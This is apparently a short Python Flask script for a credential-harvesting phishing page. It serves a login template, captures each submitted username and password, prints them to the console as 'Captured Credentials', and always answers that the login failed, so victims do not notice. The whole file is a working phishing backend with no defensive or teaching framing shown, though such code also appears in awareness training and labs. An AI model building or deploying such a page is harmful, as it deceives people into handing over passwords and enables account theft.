from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print(f"[🛡️] Captured Credentials -> Username: {username}, Password: {password}")
        return "Login failed. Try again later."

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
